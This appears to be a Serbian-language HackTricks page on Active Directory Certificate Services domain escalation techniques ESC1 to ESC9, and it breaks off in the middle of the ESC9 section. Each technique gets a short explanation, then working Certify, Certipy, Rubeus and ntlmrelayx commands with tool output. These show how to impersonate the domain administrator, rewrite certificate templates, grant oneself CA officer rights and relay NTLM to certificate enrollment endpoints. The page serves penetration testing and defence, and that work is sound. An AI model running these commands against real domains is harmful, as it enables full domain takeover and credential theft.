# AD CS Domain Escalation

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Ovo je sažetak tehnika eskalacije iz postova:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisane šablone sertifikata - ESC1

### Objasnjenje

### Pogrešno konfigurisane šablone sertifikata - ESC1 Objasnjenje

* **Prava za upis su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.**
* **Odobrenje menadžera nije potrebno.**
* **Nisu potrebni potpisi od ovlašćenog osoblja.**
* **Sigurnosni deskriptori na šablonima sertifikata su preterano dozvoljavajući, omogućavajući korisnicima sa niskim privilegijama da dobiju prava za upis.**
* **Šabloni sertifikata su konfigurisani da definišu EKU koje olakšavaju autentifikaciju:**
* Identifikatori Extended Key Usage (EKU) kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ili bez EKU (SubCA) su uključeni.
* **Mogućnost zahtevaoca da uključi subjectAltName u Certificate Signing Request (CSR) je dozvoljena šablonom:**
* Active Directory (AD) prioritetno koristi subjectAltName (SAN) u sertifikatu za verifikaciju identiteta ako je prisutan. To znači da specificiranjem SAN-a u CSR-u, sertifikat može biti zatražen da se predstavi kao bilo koji korisnik (npr. administrator domena). Da li zahtevaoc može specificirati SAN je naznačeno u AD objektu šablona sertifikata kroz svojstvo `mspki-certificate-name-flag`. Ovo svojstvo je bit maska, a prisustvo zastave `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` dozvoljava specificiranje SAN-a od strane zahtevaoca.

{% hint style="danger" %}
Konfiguracija omogućava korisnicima sa niskim privilegijama da zahtevaju sertifikate sa bilo kojim SAN-om po izboru, omogućavajući autentifikaciju kao bilo koji princip domena putem Kerberosa ili SChannel-a.
{% endhint %}

Ova funkcija je ponekad omogućena radi podrške za generisanje HTTPS ili host sertifikata "na letu" od strane proizvoda ili servisa za implementaciju, ili zbog nedostatka razumevanja.

Primećeno je da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći šablon sertifikata (kao što je `WebServer` šablon, koji ima omogućenu `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplicira, a zatim modifikuje da uključi autentifikacioni OID.

### Zloupotreba

Da **pronađete ranjive šablone sertifikata** možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da biste **zloupotrebili ovu ranjivost kako biste se predstavili kao administrator**, možete pokrenuti:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete transformisati generisani **sertifikat u `.pfx`** format i koristiti ga za **autentifikaciju pomoću Rubeusa ili certipy** ponovo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi "Certreq.exe" & "Certutil.exe" mogu se koristiti za generisanje PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija šablona sertifikata unutar AD Forest konfiguracione šeme, posebno onih koji ne zahtevaju odobrenje ili potpise, koji poseduju Client Authentication ili Smart Card Logon EKU, i sa omogućenom zastavicom `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisani šabloni sertifikata - ESC2

### Objasnjenje

Drugi scenario zloupotrebe je varijacija prvog:

1. Prava za upisivanje su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Potreba za ovlašćenim potpisima je izostavljena.
4. Previše dozvoljavajući sigurnosni deskriptor na šablonu sertifikata dodeljuje prava za upisivanje sertifikata korisnicima sa niskim privilegijama.
5. **Šablon sertifikata je definisan da uključuje Any Purpose EKU ili nema EKU.**

**Any Purpose EKU** dozvoljava sertifikatu da bude dobijen od strane napadača za **bilo koju svrhu**, uključujući autentikaciju klijenta, autentikaciju servera, potpisivanje koda, itd. Isti **tehniku koristi za ESC3** može se koristiti za iskorišćavanje ovog scenarija.

Sertifikati sa **bez EKU-ova**, koji deluju kao sertifikati podređenih CA, mogu biti iskorišćeni za **bilo koju svrhu** i takođe mogu **biti korišćeni za potpisivanje novih sertifikata**. Stoga, napadač može specificirati proizvoljne EKU-ove ili polja u novim sertifikatima koristeći sertifikat podređenog CA.

Međutim, novi sertifikati kreirani za **autentikaciju domena** neće funkcionisati ako podređeni CA nije poveren od strane objekta **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, napadač i dalje može kreirati **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Ovi sertifikati bi mogli biti potencijalno **zloupotrebljeni** za širok spektar svrha (npr. potpisivanje koda, autentikacija servera, itd.) i mogli bi imati značajne posledice za druge aplikacije u mreži poput SAML-a, AD FS-a ili IPSeca.

Da bi se nabrojali šabloni koji odgovaraju ovom scenariju unutar konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani šabloni agenta za upisivanje - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **različiti EKU** (Agent za zahtev za sertifikat) i **2 različita šablona** (stoga ima 2 skupa zahteva),

**Agent za zahtev za sertifikat EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Agent za upisivanje** u Microsoft dokumentaciji, omogućava principalu da se **upiše** za **sertifikat u ime drugog korisnika**.

**"Agent za upisivanje"** upisuje se u takav **šablon** i koristi rezultirajući **sertifikat za su-potpisivanje CSR-a u ime drugog korisnika**. Zatim **šalje** su-potpisani CSR CA-u, upisuje se u **šablon** koji **dozvoljava "upisivanje u ime"**, a CA odgovara sa **sertifikatom koji pripada "drugom" korisniku**.

**Zahtevi 1:**

* Prava za upisivanje su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.
* Zahtev za odobrenje menadžera je izostavljen.
* Nema zahteva za ovlašćenim potpisima.
* Bezbednosni opisnik šablona sertifikata je preterano dozvoljavajući, dodeljujući prava za upisivanje korisnicima sa niskim privilegijama.
* Šablon sertifikata uključuje Agent za zahtev za sertifikat EKU, omogućavajući zahtev za druge šablone sertifikata u ime drugih principala.

**Zahtevi 2:**

* Enterprise CA dodeljuje prava za upisivanje korisnicima sa niskim privilegijama.
* Odobrenje menadžera je zaobiđeno.
* Verzija šeme šablona je ili 1 ili premašuje 2, i specificira zahtev za izdavanje aplikacione politike koji zahteva Agent za zahtev za sertifikat EKU.
* EKU definisan u šablonu sertifikata dozvoljava autentikaciju domena.
* Ograničenja za agente za upisivanje nisu primenjena na CA.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) da zloupotrebite ovaj scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Korisnici** koji su dozvoljeni da **dobiju** sertifikat za **agenta za upis**, predlošci u kojima su agenti za upis dozvoljeni da se upišu, i **nalozi** u ime kojih agent za upis može delovati mogu biti ograničeni od strane preduzeća CA. Ovo se postiže otvaranjem `certsrc.msc` **snap-in**-a, **desnim klikom na CA**, **klikom na Properties**, a zatim **navigiranjem** do kartice "Agenti za upis".

Međutim, primećeno je da je **podrazumevana** postavka za CA "Ne ograničavaj agente za upis." Kada se ograničenje na agente za upis omogući od strane administratora, postavljanje na "Ograniči agente za upis," podrazumevana konfiguracija ostaje izuzetno dozvoljavajuća. To omogućava **Svima** pristup za upis u sve predloške kao bilo ko.

## Ranjiva kontrola pristupa predloška sertifikata - ESC4

### **Objašnjenje**

**Bezbednosni deskriptor** na **predlošcima sertifikata** definiše **dozvole** koje specifični **AD principali** poseduju u vezi sa predloškom.

Ukoliko **napadač** poseduje potrebne **dozvole** da **menja** **predložak** i **uspostavi** bilo koje **iskoristive loše konfiguracije** navedene u **prethodnim sekcijama**, olakšava se eskalacija privilegija.

Značajne dozvole koje se odnose na predloške sertifikata uključuju:

* **Vlasnik:** Dodeljuje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kog atributa.
* **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kog atributa.
* **WriteOwner:** Dozvoljava izmenu vlasnika objekta u principala pod kontrolom napadača.
* **WriteDacl:** Omogućava prilagođavanje pristupa kontrolama, potencijalno dodeljujući napadaču FullControl.
* **WriteProperty:** Ovlašćuje uređivanje bilo kojih svojstava objekta.

### Zloupotreba

Primer eskalacije privilegija kao prethodni:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4 je kada korisnik ima privilegije pisanja nad predloškom sertifikata. To na primer može biti zloupotrebljeno za prepisivanje konfiguracije predloška sertifikata kako bi se predložak učinio ranjivim na ESC1.

Kao što možemo videti u putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` vezu sa `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, sproveo sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Evo male demonstracije Certipy-jeve komande `shadow auto` za dobijanje NT heša žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može prebrisati konfiguraciju šablona sertifikata jednom komandom. Po **podrazumevanim podešavanjima**, Certipy će **prebrisati** konfiguraciju kako bi je učinio **ranjivom na ESC1**. Takođe možemo navesti **`-save-old` parametar da sačuvamo staru konfiguraciju**, što će biti korisno za **obnavljanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerabilna kontrola pristupa objektima PKI - ESC5

### Objasnjenje

Obimna mreža međusobno povezanih odnosa zasnovanih na ACL-u, koja uključuje nekoliko objekata izvan predložaka sertifikata i sertifikacionog tela, može uticati na sigurnost celog AD CS sistema. Ovi objekti, koji mogu značajno uticati na sigurnost, obuhvataju:

* AD računarski objekat CA servera, koji može biti kompromitovan putem mehanizama poput S4U2Self ili S4U2Proxy.
* RPC/DCOM server CA servera.
* Bilo koji potomak AD objekta ili kontejner unutar specifičnog putanje kontejnera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja uključuje, ali nije ograničena na, kontejnere i objekte poput kontejnera za predloške sertifikata, kontejnera za sertifikaciona tela, objekta NTAuthCertificates i kontejnera za usluge upisa.

Sigurnost PKI sistema može biti ugrožena ako nisko privilegovani napadač uspe da preuzme kontrolu nad bilo kojim od ovih ključnih komponenti.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objasnjenje

Tema razmatrana u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se dotiče implikacija zastave **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kako je opisano od strane Microsoft-a. Ova konfiguracija, kada je aktivirana na Sertifikacionom telu (CA), dozvoljava uključivanje **korisnički definisanih vrednosti** u **alternativno ime subjekta** za **bilo koji zahtev**, uključujući one konstruisane iz Active Directory®. Kao rezultat, ova odredba omogućava **napadaču** da se upiše putem **bilo kog predloška** postavljenog za **autentifikaciju domena**—posebno onih otvorenih za **upisivanje korisnika bez privilegija**, poput standardnog Korisničkog predloška. Kao rezultat, sertifikat može biti obezbeđen, omogućavajući napadaču da se autentifikuje kao administrator domena ili **bilo koja druga aktivna entitet** unutar domena.

**Napomena**: Pristup za dodavanje **alternativnih imena** u Zahtev za potpisivanje sertifikata (CSR), putem argumenta `-attrib "SAN:"` u `certreq.exe` (nazvanog "Parovi imena vrednosti"), predstavlja **kontrast** od strategije iskorišćavanja SAN-ova u ESC1. Ovde, razlika leži u **načinu na koji su informacije o nalogu inkapsulirane**—unutar atributa sertifikata, umesto proširenja.

### Zloupotreba

Da bi proverile da li je podešavanje aktivirano, organizacije mogu koristiti sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u osnovi koristi **pristup udaljenom registru**, stoga, alternativni pristup može biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati poput [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) sposobni su da detektuju ovu lošu konfiguraciju i iskoriste je:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Da biste promenili ove postavke, pretpostavljajući da osoba poseduje **administrativna prava domena** ili ekvivalentna prava, sledeća komanda može se izvršiti sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, zastava se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Nakon sigurnosnih ažuriranja u maju 2022, novo izdata **sertifikati** će sadržati **sigurnosno proširenje** koje uključuje **`objectSid` svojstvo zahtevaoca**. Za ESC1, ovaj SID se izvodi iz određenog SAN-a. Međutim, za **ESC6**, SID odražava **`objectSid` zahtevaoca**, a ne SAN.\
Da bi se iskoristio ESC6, sistem mora biti podložan ESC10 (Slaba mapiranja sertifikata), koji prioritet daje **SAN-u nad novim sigurnosnim proširenjem**.
{% endhint %}

## Vulnerabilna kontrola pristupa sertifikacionom telu - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa za sertifikaciono telo održava se kroz skup dozvola koje regulišu rad CA. Ove dozvole mogu se pregledati pristupom `certsrv.msc`, desnim klikom na CA, izborom svojstava, a zatim navigiranjem do kartice Security. Dodatno, dozvole se mogu nabrojati korišćenjem PSPKI modula pomoću komandi kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvide u osnovna prava, tačnije **`ManageCA`** i **`ManageCertificates`**, koje se odnose na uloge "administratora CA" i "menadžera sertifikata" redom.

#### Zloupotreba

Imajući prava **`ManageCA`** na autoritetu za sertifikate omogućava subjektu da daljinski manipuliše postavkama koristeći PSPKI. To uključuje prebacivanje zastave **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kako bi se omogućila specifikacija SAN-a u bilo kojem obrascu, što je ključni aspekt eskalacije domena.

Ovaj proces može se pojednostaviti korišćenjem PSPKI-ovog **Enable-PolicyModuleFlag** cmdleta, što omogućava modifikacije bez direktnog GUI interakcije.

Posedovanje prava **`ManageCertificates`** olakšava odobravanje zahteva na čekanju, efikasno zaobilazeći zaštitu "odobravanja menadžera sertifikata CA".

Kombinacija modula **Certify** i **PSPKI** može se koristiti za zahtevanje, odobravanje i preuzimanje sertifikata:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objasnjenje

{% hint style="warning" %}
U **prethodnom napadu** su korišćene dozvole **`Manage CA`** za **omogućavanje** zastave **EDITF\_ATTRIBUTESUBJECTALTNAME2** kako bi se izveo **ESC6 napad**, ali ovo neće imati efekta dok se usluga CA (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa `Manage CA`, korisniku je takođe dozvoljeno da **restartuje uslugu**. Međutim, to **ne znači da korisnik može da restartuje uslugu udaljeno**. Štaviše, **ESC6 možda neće raditi odmah** u većini ažuriranih okruženja zbog bezbednosnih ažuriranja iz maja 2022. godine.
{% endhint %}

Stoga, ovde je predstavljen još jedan napad.

Preduslovi:

* Samo **dozvola `ManageCA`**
* Dozvola **`Manage Certificates`** (može biti dodeljena iz **`ManageCA`**)
* Šablon sertifikata **`SubCA`** mora biti **omogućen** (može biti omogućen iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravom pristupa `Manage CA` _i_ `Manage Certificates` mogu **izdati neuspele zahteve za sertifikate**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali **samo administratori** mogu upisati u šablon. Dakle, **korisnik** može **zatražiti** upis u **`SubCA`** - što će biti **odbijeno** - ali će **zatim biti izdato od strane menadžera**.

#### Zloupotreba

Možete **dodeliti sebi pristup `Manage Certificates`** dodavanjem vašeg korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** šablon se može **omogućiti na CA** pomoću parametra `-enable-template`. Podrazumevano, **`SubCA`** šablon je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi sa **zahtevom za sertifikat zasnovan na šablonu `SubCA`**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim **`Upravljaj CA` i `Upravljaj Sertifikatima`**, možemo zatim **izdati zahtev za neuspeli sertifikat** pomoću `ca` komande i parametra `-issue-request <ID zahteva>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na kraju, možemo **dobiti izdati sertifikat** pomoću `req` komande i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay na AD CS HTTP krajnjim tačkama – ESC8

### Objasnjenje

{% hint style="info" %}
U okruženjima gde je **AD CS instaliran**, ako postoji **ranjiva web upisna tačka** i bar jedan **šablon sertifikata je objavljen** koji dozvoljava **upisivanje domenskog računara i autentifikaciju klijenta** (kao što je podrazumevani **`Machine`** šablon), postaje moguće da **bilo koji računar sa aktivnom uslugom spulera bude kompromitovan od strane napadača**!
{% endhint %}

Nekoliko **HTTP-based metoda upisa** podržano je od strane AD CS, dostupno kroz dodatne serverske uloge koje administratori mogu instalirati. Ove interfejsi za HTTP-based upisivanje sertifikata su podložni **NTLM relay napadima**. Napadač, sa **kompromitovanog računara, može se predstaviti kao bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM**. Dok se predstavlja kao žrtveni nalog, ovi web interfejsi mogu biti pristupljeni od strane napadača da **zahtevaju sertifikat za autentifikaciju klijenta koristeći `User` ili `Machine` šablone sertifikata**.

* **Web upisni interfejs** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`), podrazumevano koristi samo HTTP, što ne pruža zaštitu od NTLM relay napada. Dodatno, eksplicitno dozvoljava samo NTLM autentifikaciju putem svoje Autorizacije HTTP zaglavlja, čime čini sigurnije metode autentifikacije poput Kerberosa neprimenljivim.
* **Servis za upisivanje sertifikata** (CES), **Servis za politiku upisivanja sertifikata** (CEP) i **Servis za upisivanje mrežnih uređaja** (NDES) podrazumevano podržavaju pregovaranje autentifikacije putem njihovog Autorizacije HTTP zaglavlja. Pregovaranje autentifikacije **podržava i** Kerberos i **NTLM**, omogućavajući napadaču da **spusti na NTLM** autentifikaciju tokom relay napada. Iako ovi web servisi podrazumevano omogućavaju HTTPS, HTTPS sam po sebi **ne štiti od NTLM relay napada**. Zaštita od NTLM relay napada za HTTPS servise je moguća samo kada se HTTPS kombinuje sa vezivanjem kanala. Nažalost, AD CS ne aktivira Proširenu zaštitu za autentifikaciju na IIS-u, što je potrebno za vezivanje kanala.

Uobičajeni **problem** sa NTLM relay napadima je **kratko trajanje NTLM sesija** i nemogućnost napadača da interaguje sa servisima koji **zahtevaju NTLM potpisivanje**.

Ipak, ova ograničenja se prevazilaze iskorišćavanjem NTLM relay napada da bi se stekao sertifikat za korisnika, jer period važenja sertifikata određuje trajanje sesije, i sertifikat može biti korišćen sa servisima koji **zahtevaju NTLM potpisivanje**. Za uputstva o korišćenju ukradenog sertifikata, pogledajte:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Još jedno ograničenje NTLM relay napada je da **napadački kontrolisani računar mora biti autentifikovan od strane žrtvenog naloga**. Napadač može sačekati ili pokušati da **prisili** ovu autentifikaciju:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify) `cas` enumeriše **omogućene HTTP AD CS krajnje tačke**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koristi se od strane preduzeća za čuvanje krajnjih tačaka usluge za upis sertifikata (CES). Ove tačke mogu biti analizirane i navedene korišćenjem alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Zloupotreba sa Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba sa [Certipy](https://github.com/ly4k/Certipy)

Zahtev za sertifikat podrazumevano pravi Certipy na osnovu šablona `Machine` ili `User`, određenog na osnovu toga da li ime naloga završava znakom `$`. Specifikacija alternativnog šablona može se postići korišćenjem parametra `-template`.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) može se zatim koristiti za prinudu autentikacije. Kada se radi sa kontrolorima domena, potrebna je specifikacija `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Bez proširenja sigurnosti - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objasnjenje

Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, poznata kao ESC9, sprečava ugradnju **novog sigurnosnog proširenja `szOID_NTDS_CA_SECURITY_EXT`** u sertifikat. Ova zastava postaje relevantna kada je `StrongCertificateBindingEnforcement` postavljen na `1` (podrazumevana postavka), što se suprotstavlja postavci `2`. Njena važnost se povećava u scenarijima gde bi slabije mapiranje sertifikata za Kerberos ili Schannel moglo biti iskorišćeno (kao u ESC10), s obzirom da odsustvo ESC9 ne bi promenilo zahteve.

Uslovi pod kojima postavljanje ove zastave postaje značajno uključuju:

* `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevana vrednost je `1`), ili `CertificateMappingMethods` uključuje zastavu `UPN`.
* Sertifikat je označen zastavom `CT_FLAG_NO_SECURITY_EXTENSION` unutar postavke `msPKI-Enrollment-Flag`.
* Bilo koja EKU za autentifikaciju klijenta je navedena u sertifikatu.
* `GenericWrite` dozvole su dostupne nad bilo kojim nalogom kako bi se kompromitovao drugi.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad `Jane@corp.local`, sa ciljem da kompromituje `Administrator@corp.local`. Šablon sertifikata `ESC9`, u koji je `Jane@corp.local` dozvoljeno da se upiše, konfigurisan je sa zastavom `CT_FLAG_NO_SECURITY_EXTENSION` u svojoj postavci `msPKI-Enrollment-Flag`.

Prvo, `Jane`-ov heš se dobija korišćenjem Senki Credentials, zahvaljujući `John`-ovom `GenericWrite`:
```bash
